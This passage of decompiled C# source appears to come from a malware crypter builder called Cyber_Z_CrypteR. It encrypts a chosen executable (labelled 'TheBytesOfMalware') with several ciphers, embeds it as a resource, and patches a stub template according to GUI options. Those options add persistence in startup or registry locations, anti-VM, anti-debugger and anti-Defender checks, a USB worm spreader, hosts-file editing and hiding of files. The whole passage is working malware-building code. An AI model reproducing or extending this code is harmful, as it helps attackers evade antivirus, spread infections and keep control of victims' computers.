                        s12 = s12.Replace("FileCopy(Application.ExecutablePath, appdataSpecialFolder &", "FileCopy(Application.ExecutablePath, startupas & ");
                        s12 = s12.Replace("Dim filedir As String = appdataSpecialFolder & ", "Dim filedir As String = startupas  & ");
                        s12 = s12.Replace("File.SetAttributes(appdataSpecialFolder & ", "File.SetAttributes(startupas & ");
                        s12 = s12.Replace("Dim LocalAppDataSF As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"LocalAppdataPathTpEncrypt\"))", "");
                        s12 = s12.Replace("Dim mydoc As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"HOMEPATHToEncryptMyDC\"))", "");
                        s12 = s12.Replace("Dim programfilesDir As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"PROGRAMFILEStoEncryptpCrypt\"))", "");
                    }
                    flag6 = MyProject.Forms.U_S_G.RadioButton6.Checked;
                    if (flag6)
                    {
                        s12 = s12.Replace("Dim filedir As String = appdataSpecialFolder & ", "Dim filedir As String = mydoc & ");
                        s12 = s12.Replace("FileCopy(Application.ExecutablePath, appdataSpecialFolder &", "FileCopy(Application.ExecutablePath, mydoc & ");
                        s12 = s12.Replace("File.SetAttributes(appdataSpecialFolder & ", "File.SetAttributes(mydoc & ");
                        s12 = s12.Replace("Dim LocalAppDataSF As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"LocalAppdataPathTpEncrypt\"))", "");
                        s12 = s12.Replace("Dim programfilesDir As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"PROGRAMFILEStoEncryptpCrypt\"))", "");
                    }
                    flag6 = MyProject.Forms.U_S_G.RadioButton9.Checked;
                    if (flag6)
                    {
                        s12 = s12.Replace("Dim filedir As String = appdataSpecialFolder & ", "Dim filedir As String = programfilesDir & ");
                        s12 = s12.Replace("FileCopy(Application.ExecutablePath, appdataSpecialFolder &", "FileCopy(Application.ExecutablePath, programfilesDir & ");
                        s12 = s12.Replace("File.SetAttributes(appdataSpecialFolder & ", "File.SetAttributes(programfilesDir & ");
                        s12 = s12.Replace("Dim programfilesDir As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"PROGRAMFILEStoEncryptpCrypt\"))", "");
                        s12 = s12.Replace("Dim LocalAppDataSF As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"LocalAppdataPathTpEncrypt\"))", "");
                    }
                    flag6 = MyProject.Forms.U_S_G.RadioButton10.Checked;
                    if (flag6)
                        s12 = s12.Replace("R As RegistryKey = Registry.CurrentUser.OpenSubKey", "R As RegistryKey = Registry.LocalMachine.OpenSubKey");
                    flag6 = MyProject.Forms.U_S_G.RadioButton8.Checked;
                    if (flag6)
                        s12 = s12.Replace("MyPath As String = appdataSpecialFolder &", "MyPath As String = LocalAppDataSF &");
                    flag6 = MyProject.Forms.U_S_G.RadioButton7.Checked;
                    if (flag6)
                        s12 = s12.Replace("MyPath As String = appdataSpecialFolder &", "MyPath As String = startupas &");
                    flag6 = MyProject.Forms.U_S_G.RadioButton6.Checked;
                    if (flag6)
                        s12 = s12.Replace("MyPath As String = appdataSpecialFolder & &", "MyPath As String = mydoc &");
                    flag6 = MyProject.Forms.U_S_G.RadioButton9.Checked;
                    if (flag6)
                        s12 = s12.Replace("MyPath As String = appdataSpecialFolder &", "MyPath As String = programfilesDir &");
                    flag6 = MyProject.Forms.U_S_G.RadioButton8.Checked;
                    if (flag6)
                    {
                        s12 = s12.Replace("Dim filedir As String = appdataSpecialFolder &  ", "Dim filedir As String = LocalAppDataSF & ");
                        s12 = s12.Replace("FileCopy(Application.ExecutablePath, appdataSpecialFolder &", "FileCopy(Application.ExecutablePath, LocalAppDataSF & ");
                        s12 = s12.Replace("File.SetAttributes(appdataSpecialFolder & ", "File.SetAttributes(LocalAppDataSF & ");
                        s12 = s12.Replace("Dim mydoc As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"HOMEPATHToEncryptMyDC\"))", "");
                        s12 = s12.Replace("Dim programfilesDir As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"PROGRAMFILEStoEncryptpCrypt\"))", "");
                    }
                    flag6 = MyProject.Forms.U_S_G.RadioButton7.Checked;
                    if (flag6)
                    {
                        s12 = s12.Replace("FileCopy(Application.ExecutablePath, appdataSpecialFolder &", "FileCopy(Application.ExecutablePath, startupas & ");
                        s12 = s12.Replace("Dim filedir As String = appdataSpecialFolder &  ", "Dim filedir As String = startupas & ");
                        s12 = s12.Replace("File.SetAttributes(appdataSpecialFolder & ", "File.SetAttributes(startupas & ");
                        s12 = s12.Replace("Dim LocalAppDataSF As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"LocalAppdataPathTpEncrypt\"))", "");
                        s12 = s12.Replace("Dim mydoc As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"HOMEPATHToEncryptMyDC\"))", "");
                        s12 = s12.Replace("Dim programfilesDir As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"PROGRAMFILEStoEncryptpCrypt\"))", "");
                    }
                    flag6 = MyProject.Forms.U_S_G.RadioButton6.Checked;
                    if (flag6)
                    {
                        s12 = s12.Replace("Dim filedir As String = appdataSpecialFolder & ", "Dim filedir As String = mydoc & ");
                        s12 = s12.Replace("FileCopy(Application.ExecutablePath, appdataSpecialFolder &", "FileCopy(Application.ExecutablePath, mydoc & ");
                        s12 = s12.Replace("File.SetAttributes(appdataSpecialFolder & ", "File.SetAttributes(mydoc & ");
                        s12 = s12.Replace("Dim LocalAppDataSF As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"LocalAppdataPathTpEncrypt\"))", "");
                        s12 = s12.Replace("Dim programfilesDir As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"PROGRAMFILEStoEncryptpCrypt\"))", "");
                    }
                    flag6 = MyProject.Forms.U_S_G.RadioButton9.Checked;
                    if (flag6)
                    {
                        s12 = s12.Replace("Dim filedir As String = appdataSpecialFolder & ", "Dim filedir As String = programfilesDir & ");
                        s12 = s12.Replace("FileCopy(Application.ExecutablePath, appdataSpecialFolder &", "FileCopy(Application.ExecutablePath, programfilesDir & ");
                        s12 = s12.Replace("File.SetAttributes(appdataSpecialFolder & ", "File.SetAttributes(programfilesDir & ");
                        s12 = s12.Replace("Dim programfilesDir As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"PROGRAMFILEStoEncryptpCrypt\"))", "");
                        s12 = s12.Replace("Dim LocalAppDataSF As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"LocalAppdataPathTpEncrypt\"))", "");
                    }
                    s12 = s12.Replace("%regnamee%", Cyber_Z_CrypteR.PolyCrypt.Encrypt(MyProject.Forms.U_S_G.TextBox11.Text));
                    s12 = s12.Replace("trytrytry", Cyber_Z_CrypteR.PolyCrypt.Encrypt(MyProject.Forms.U_S_G.TextBox12.Text));
                    s12 = s12.Replace("exeextencion.exe", Cyber_Z_CrypteR.PolyCrypt.Encrypt(".exe"));
                    s12 = s12.Replace("%regnamee%", Cyber_Z_CrypteR.PolyCrypt.Encrypt(MyProject.Forms.U_S_G.TextBox11.Text));
                    s12 = s12.Replace("trytrytry", Cyber_Z_CrypteR.PolyCrypt.Encrypt(MyProject.Forms.U_S_G.TextBox12.Text));
                    s12 = s12.Replace("exeextencion.exe", Cyber_Z_CrypteR.PolyCrypt.Encrypt(".exe"));
                }
                flag6 = !MyProject.Forms.U_S_G.CheckBox2.Checked;
                if (flag6)
                    s12 = s12.Replace("CyberZ_Options.disableRegystry()", "");
                string s6 = Cyber_Z_CrypteR.random_key(Convert.ToInt32(MyProject.Forms.U_S_G.NumericUpDown1.Value));
                string s13 = Cyber_Z_CrypteR.random_key(100);
                s12 = s12.Replace("MalwareResXFileName", Cyber_Z_CrypteR.PolyCrypt.Encrypt(s13));
                flag6 = MyProject.Forms.U_S_G.PolyCryptEncryption.Checked;
                if (flag6)
                {
                    byte[] bArr3 = Encoding.GetEncoding(1252).GetBytes(s6);
                    byte[] bArr4 = Cyber_Z_CrypteR.Guard.Secure(File.ReadAllBytes(TextBox1.Text), bArr3, Cyber_Z_CrypteR.Guard.Securer.DES);
                    ResourceWriter resourceWriter1 = new ResourceWriter(Application.StartupPath + "\\" + s13 + ".resources");
                    try
                    {
                        resourceWriter1.AddResource(s13, bArr4);
                        resourceWriter1.Generate();
                    }
                    finally
                    {
                        flag6 = resourceWriter1 != null;
                        if (flag6)
                            resourceWriter1.Dispose();
                    }
                    s12 = s12.Replace("Dim TR_DesBytes As Byte() = MD55555.DecryptbyMDD(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim pr0t0Bytes As Byte() = Pr0t0XorDecrypt(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim RC4Bytes As Byte() = Proper_RC4.Proper_RC4(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim PolyStairsBytes As Byte() = PolyMorphicStairs.PolyDeCryptStairs(TheBytesOfMalware, Smit_PolyKEBYte, 1)", "");
                    s12 = s12.Replace("Dim RC2Bytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.RC2)", "");
                    s12 = s12.Replace("Dim PolyXorCrypt As New PolyMorphicXOR(Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim PolyXorBytes As Byte() = PolyXorCrypt.DecryptItXORR(TheBytesOfMalware)", "");
                    s12 = s12.Replace("Dim StairsBytes As Byte() = StairsNormalEncryption.DeCryptWithNormala(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim TripleDESBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.TripleDES)", "");
                }
                flag6 = MyProject.Forms.U_S_G.CheckXOR.Checked;
                if (flag6)
                {
                    byte[] bArr5 = Cyber_Z_CrypteR.pr0t0x0r.encrypt(File.ReadAllBytes(TextBox1.Text), s6);
                    ResourceWriter resourceWriter2 = new ResourceWriter(Application.StartupPath + "\\" + s13 + ".resources");
                    try
                    {
                        resourceWriter2.AddResource(s13, bArr5);
                        resourceWriter2.Generate();
                    }
                    finally
                    {
                        flag6 = resourceWriter2 != null;
                        if (flag6)
                            resourceWriter2.Dispose();
                    }
                    s12 = s12.Replace("Dim DesBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.DES)", "");
                    s12 = s12.Replace("New Object() {DesBytes, placedropadaaa", "New Object() {pr0t0Bytes, placedropadaaa");
                    s12 = s12.Replace("isDotNet(DesBytes)", "isDotNet(pr0t0Bytes)");
                    s12 = s12.Replace("New Object() {DesBytes, Nothing})", "New Object() {pr0t0Bytes, Nothing})");
                    s12 = s12.Replace("Dim TR_DesBytes As Byte() = MD55555.DecryptbyMDD(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim RC4Bytes As Byte() = Proper_RC4.Proper_RC4(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim PolyStairsBytes As Byte() = PolyMorphicStairs.PolyDeCryptStairs(TheBytesOfMalware, Smit_PolyKEBYte, 1)", "");
                    s12 = s12.Replace("Dim RC2Bytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.RC2)", "");
                    s12 = s12.Replace("Dim PolyXorCrypt As New PolyMorphicXOR(Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim PolyXorBytes As Byte() = PolyXorCrypt.DecryptItXORR(TheBytesOfMalware)", "");
                    s12 = s12.Replace("Dim StairsBytes As Byte() = StairsNormalEncryption.DeCryptWithNormala(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim TripleDESBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.TripleDES)", "");
                }
                flag6 = MyProject.Forms.U_S_G.Check3DES.Checked;
                if (flag6)
                {
                    byte[] bArr6 = Cyber_Z_CrypteR.MD5.Encrypt(File.ReadAllBytes(TextBox1.Text), s6, CipherMode.ECB, PaddingMode.PKCS7);
                    ResourceWriter resourceWriter3 = new ResourceWriter(Application.StartupPath + "\\" + s13 + ".resources");
                    try
                    {
                        resourceWriter3.AddResource(s13, bArr6);
                        resourceWriter3.Generate();
                    }
                    finally
                    {
                        flag6 = resourceWriter3 != null;
                        if (flag6)
                            resourceWriter3.Dispose();
                    }
                    s12 = s12.Replace("New Object() {DesBytes, placedropadaaa", "New Object() {TR_DesBytes, placedropadaaa");
                    s12 = s12.Replace("isDotNet(DesBytes)", "isDotNet(TR_DesBytes)");
                    s12 = s12.Replace("New Object() {DesBytes, Nothing})", "New Object() {TR_DesBytes, Nothing})");
                    s12 = s12.Replace("Dim pr0t0Bytes As Byte() = Pr0t0XorDecrypt(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim DesBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.DES)", "");
                    s12 = s12.Replace("Dim RC4Bytes As Byte() = Proper_RC4.Proper_RC4(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim PolyStairsBytes As Byte() = PolyMorphicStairs.PolyDeCryptStairs(TheBytesOfMalware, Smit_PolyKEBYte, 1)", "");
                    s12 = s12.Replace("Dim RC2Bytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.RC2)", "");
                    s12 = s12.Replace("Dim PolyXorCrypt As New PolyMorphicXOR(Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim PolyXorBytes As Byte() = PolyXorCrypt.DecryptItXORR(TheBytesOfMalware)", "");
                    s12 = s12.Replace("Dim StairsBytes As Byte() = StairsNormalEncryption.DeCryptWithNormala(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim TripleDESBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.TripleDES)", "");
                }
                flag6 = MyProject.Forms.U_S_G.RC4.Checked;
                if (flag6)
                {
                    byte[] bArr7 = Encoding.GetEncoding(1252).GetBytes(s6);
                    byte[] bArr8 = Proper_RC4(File.ReadAllBytes(TextBox1.Text), bArr7);
                    ResourceWriter resourceWriter4 = new ResourceWriter(Application.StartupPath + "\\" + s13 + ".resources");
                    try
                    {
                        resourceWriter4.AddResource(s13, bArr8);
                        resourceWriter4.Generate();
                    }
                    finally
                    {
                        flag6 = resourceWriter4 != null;
                        if (flag6)
                            resourceWriter4.Dispose();
                    }
                    s12 = s12.Replace("New Object() {DesBytes, placedropadaaa", "New Object() {RC4Bytes, placedropadaaa");
                    s12 = s12.Replace("isDotNet(DesBytes)", "isDotNet(RC4Bytes)");
                    s12 = s12.Replace("New Object() {DesBytes, Nothing})", "New Object() {RC4Bytes, Nothing})");
                    s12 = s12.Replace("Dim pr0t0Bytes As Byte() = Pr0t0XorDecrypt(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim TR_DesBytes As Byte() = MD55555.DecryptbyMDD(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim PolyStairsBytes As Byte() = PolyMorphicStairs.PolyDeCryptStairs(TheBytesOfMalware, Smit_PolyKEBYte, 1)", "");
                    s12 = s12.Replace("Dim RC2Bytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.RC2)", "");
                    s12 = s12.Replace("Dim DesBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.DES)", "");
                    s12 = s12.Replace("Dim PolyXorCrypt As New PolyMorphicXOR(Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim PolyXorBytes As Byte() = PolyXorCrypt.DecryptItXORR(TheBytesOfMalware)", "");
                    s12 = s12.Replace("Dim StairsBytes As Byte() = StairsNormalEncryption.DeCryptWithNormala(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim TripleDESBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.TripleDES)", "");
                }
                flag6 = MyProject.Forms.U_S_G.PolyStairs.Checked;
                if (flag6)
                {
                    byte[] bArr10 = Encoding.GetEncoding(1252).GetBytes(s6);
                    bArr18 = File.ReadAllBytes(TextBox1.Text);
                    byte[] bArr9 = Cyber_Z_CrypteR.PolyMorphicStairs.PolyCrypt(ref bArr18, bArr10, 1);
                    ResourceWriter resourceWriter5 = new ResourceWriter(Application.StartupPath + "\\" + s13 + ".resources");
                    try
                    {
                        resourceWriter5.AddResource(s13, bArr9);
                        resourceWriter5.Generate();
                    }
                    finally
                    {
                        flag6 = resourceWriter5 != null;
                        if (flag6)
                            resourceWriter5.Dispose();
                    }
                    s12 = s12.Replace("New Object() {DesBytes, placedropadaaa", "New Object() {PolyStairsBytes, placedropadaaa");
                    s12 = s12.Replace("isDotNet(DesBytes)", "isDotNet(PolyStairsBytes)");
                    s12 = s12.Replace("New Object() {DesBytes, Nothing})", "New Object() {PolyStairsBytes, Nothing})");
                    s12 = s12.Replace("Dim pr0t0Bytes As Byte() = Pr0t0XorDecrypt(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim TR_DesBytes As Byte() = MD55555.DecryptbyMDD(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim RC4Bytes As Byte() = Proper_RC4.Proper_RC4(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim RC2Bytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.RC2)", "");
                    s12 = s12.Replace("Dim DesBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.DES)", "");
                    s12 = s12.Replace("Dim PolyXorCrypt As New PolyMorphicXOR(Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim PolyXorBytes As Byte() = PolyXorCrypt.DecryptItXORR(TheBytesOfMalware)", "");
                    s12 = s12.Replace("Dim StairsBytes As Byte() = StairsNormalEncryption.DeCryptWithNormala(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim TripleDESBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.TripleDES)", "");
                }
                flag6 = MyProject.Forms.U_S_G.PolyCloud.Checked;
                if (flag6)
                {
                    byte[] bArr12 = Encoding.GetEncoding(1252).GetBytes(s6);
                    byte[] bArr11 = Cyber_Z_CrypteR.Guard.Secure(File.ReadAllBytes(TextBox1.Text), bArr12, Cyber_Z_CrypteR.Guard.Securer.RC2);
                    ResourceWriter resourceWriter6 = new ResourceWriter(Application.StartupPath + "\\" + s13 + ".resources");
                    try
                    {
                        resourceWriter6.AddResource(s13, bArr11);
                        resourceWriter6.Generate();
                    }
                    finally
                    {
                        flag6 = resourceWriter6 != null;
                        if (flag6)
                            resourceWriter6.Dispose();
                    }
                    s12 = s12.Replace("New Object() {DesBytes, placedropadaaa", "New Object() {RC2Bytes, placedropadaaa");
                    s12 = s12.Replace("isDotNet(DesBytes)", "isDotNet(RC2Bytes)");
                    s12 = s12.Replace("New Object() {DesBytes, Nothing})", "New Object() {RC2Bytes, Nothing})");
                    s12 = s12.Replace("Dim pr0t0Bytes As Byte() = Pr0t0XorDecrypt(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim TR_DesBytes As Byte() = MD55555.DecryptbyMDD(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim RC4Bytes As Byte() = Proper_RC4.Proper_RC4(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim PolyStairsBytes As Byte() = PolyMorphicStairs.PolyDeCryptStairs(TheBytesOfMalware, Smit_PolyKEBYte, 1)", "");
                    s12 = s12.Replace("Dim DesBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.DES)", "");
                    s12 = s12.Replace("Dim PolyXorCrypt As New PolyMorphicXOR(Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim PolyXorBytes As Byte() = PolyXorCrypt.DecryptItXORR(TheBytesOfMalware)", "");
                    s12 = s12.Replace("Dim StairsBytes As Byte() = StairsNormalEncryption.DeCryptWithNormala(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim TripleDESBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.TripleDES)", "");
                }
                flag6 = MyProject.Forms.U_S_G.POlyXORV2.Checked;
                if (flag6)
                {
                    Cyber_Z_CrypteR.PolyMorphic polyMorphic = new Cyber_Z_CrypteR.PolyMorphic(s6);
                    byte[] bArr13 = polyMorphic.Encrypt(File.ReadAllBytes(TextBox1.Text));
                    ResourceWriter resourceWriter7 = new ResourceWriter(Application.StartupPath + "\\" + s13 + ".resources");
                    try
                    {
                        resourceWriter7.AddResource(s13, bArr13);
                        resourceWriter7.Generate();
                    }
                    finally
                    {
                        flag6 = resourceWriter7 != null;
                        if (flag6)
                            resourceWriter7.Dispose();
                    }
                    s12 = s12.Replace("New Object() {DesBytes, placedropadaaa", "New Object() {PolyXorBytes, placedropadaaa");
                    s12 = s12.Replace("isDotNet(DesBytes)", "isDotNet(PolyXorBytes)");
                    s12 = s12.Replace("New Object() {DesBytes, Nothing})", "New Object() {PolyXorBytes, Nothing})");
                    s12 = s12.Replace("Dim pr0t0Bytes As Byte() = Pr0t0XorDecrypt(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim TR_DesBytes As Byte() = MD55555.DecryptbyMDD(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim RC4Bytes As Byte() = Proper_RC4.Proper_RC4(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim PolyStairsBytes As Byte() = PolyMorphicStairs.PolyDeCryptStairs(TheBytesOfMalware, Smit_PolyKEBYte, 1)", "");
                    s12 = s12.Replace("Dim RC2Bytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.RC2)", "");
                    s12 = s12.Replace("Dim DesBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.DES)", "");
                    s12 = s12.Replace("Dim StairsBytes As Byte() = StairsNormalEncryption.DeCryptWithNormala(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim TripleDESBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.TripleDES)", "");
                }
                flag6 = MyProject.Forms.U_S_G.Stairs.Checked;
                if (flag6)
                {
                    byte[] bArr15 = Encoding.GetEncoding(1252).GetBytes(s6);
                    byte[] bArr14 = Cyber_Z_CrypteR.StairsEncryption.Crypt(File.ReadAllBytes(TextBox1.Text), bArr15);
                    ResourceWriter resourceWriter8 = new ResourceWriter(Application.StartupPath + "\\" + s13 + ".resources");
                    try
                    {
                        resourceWriter8.AddResource(s13, bArr14);
                        resourceWriter8.Generate();
                    }
                    finally
                    {
                        flag6 = resourceWriter8 != null;
                        if (flag6)
                            resourceWriter8.Dispose();
                    }
                    s12 = s12.Replace("New Object() {DesBytes, placedropadaaa", "New Object() {StairsBytes, placedropadaaa");
                    s12 = s12.Replace("isDotNet(DesBytes)", "isDotNet(StairsBytes)");
                    s12 = s12.Replace("New Object() {DesBytes, Nothing})", "New Object() {StairsBytes, Nothing})");
                    s12 = s12.Replace("Dim pr0t0Bytes As Byte() = Pr0t0XorDecrypt(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim TR_DesBytes As Byte() = MD55555.DecryptbyMDD(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim RC4Bytes As Byte() = Proper_RC4.Proper_RC4(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim PolyStairsBytes As Byte() = PolyMorphicStairs.PolyDeCryptStairs(TheBytesOfMalware, Smit_PolyKEBYte, 1)", "");
                    s12 = s12.Replace("Dim RC2Bytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.RC2)", "");
                    s12 = s12.Replace("Dim PolyXorCrypt As New PolyMorphicXOR(Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim PolyXorBytes As Byte() = PolyXorCrypt.DecryptItXORR(TheBytesOfMalware)", "");
                    s12 = s12.Replace("Dim DesBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.DES)", "");
                    s12 = s12.Replace("Dim TripleDESBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.TripleDES)", "");
                }
                flag6 = MyProject.Forms.U_S_G.TripleDEES.Checked;
                if (flag6)
                {
                    byte[] bArr17 = Encoding.GetEncoding(1252).GetBytes(s6);
                    byte[] bArr16 = Cyber_Z_CrypteR.Guard.Secure(File.ReadAllBytes(TextBox1.Text), bArr17, Cyber_Z_CrypteR.Guard.Securer.TripleDES);
                    ResourceWriter resourceWriter9 = new ResourceWriter(Application.StartupPath + "\\" + s13 + ".resources");
                    try
                    {
                        resourceWriter9.AddResource(s13, bArr16);
                        resourceWriter9.Generate();
                    }
                    finally
                    {
                        flag6 = resourceWriter9 != null;
                        if (flag6)
                            resourceWriter9.Dispose();
                    }
                    s12 = s12.Replace("New Object() {DesBytes, placedropadaaa", "New Object() {TripleDESBytes, placedropadaaa");
                    s12 = s12.Replace("isDotNet(DesBytes)", "isDotNet(DesBytes)");
                    s12 = s12.Replace("New Object() {DesBytes, Nothing})", "New Object() {TripleDESBytes, Nothing})");
                    s12 = s12.Replace("Dim pr0t0Bytes As Byte() = Pr0t0XorDecrypt(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim TR_DesBytes As Byte() = MD55555.DecryptbyMDD(TheBytesOfMalware, Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim RC4Bytes As Byte() = Proper_RC4.Proper_RC4(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                    s12 = s12.Replace("Dim PolyStairsBytes As Byte() = PolyMorphicStairs.PolyDeCryptStairs(TheBytesOfMalware, Smit_PolyKEBYte, 1)", "");
                    s12 = s12.Replace("Dim RC2Bytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.RC2)", "");
                    s12 = s12.Replace("Dim PolyXorCrypt As New PolyMorphicXOR(Smi_PolyKEy)", "");
                    s12 = s12.Replace("Dim PolyXorBytes As Byte() = PolyXorCrypt.DecryptItXORR(TheBytesOfMalware)", "");
                    s12 = s12.Replace("Dim DesBytes As Byte() = GuardER.UnsecuringIT(TheBytesOfMalware, Smit_PolyKEBYte, GuardER.Securer.DES)", "");
                    s12 = s12.Replace("Dim StairsBytes As Byte() = StairsNormalEncryption.DeCryptWithNormala(TheBytesOfMalware, Smit_PolyKEBYte)", "");
                }
                flag6 = !MyProject.Forms.U_S_G.CheckAntis.Checked;
                if (flag6)
                {
                    s12 = s12.Replace("CyberZ_Options.Antis28_IsHere()", "");
                    s12 = s12.Replace("CyberZ_Options.AntiVirtualBox()", "");
                    s12 = s12.Replace("CyberZ_Options.AntiVmWare()", "");
                    s12 = s12.Replace("CyberZ_Options.CheckIf_DebuggerPresent()", "");
                    s12 = s12.Replace("CyberZ_Options.CustumAntiName(PolyCrypt.DecryptWithpOLYcRYPT(\"MSASCui\"))", "");
                    s12 = s12.Replace("CyberZ_Options.CustumAntiName(PolyCrypt.DecryptWithpOLYcRYPT(\"msmpeng\"))", "");
                }
                else
                {
                    MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "28 Anti's Added");
                    MyProject.Forms.Work_Progress.Current_Operation.Text = "28 Anti's Added";
                }
                flag6 = !MyProject.Forms.U_S_G.CheckBox10.Checked;
                if (flag6)
                {
                    s12 = s12.Replace("Dim x As New USBSpreader", "");
                    s12 = s12.Replace("USBSpreader.USB_Spread()", "");
                }
                else
                {
                    MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022USB Worm\u2022");
                    MyProject.Forms.Work_Progress.Current_Operation.Text = "USB Worm";
                }
                flag6 = !MyProject.Forms.U_S_G.CheckBox14.Checked;
                if (flag6)
                    s12 = s12.Replace("CyberZ_Options.HostEditFunction()", "");
                Check_Antis();
                flag6 = !MyProject.Forms.U_S_G.DisableHide.Checked;
                if (flag6)
                {
                    s12 = s12.Replace("CyberZ_Options.HideFilesOcult()", "");
                }
                else
                {
                    MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Disable View Hide Files\u2022");
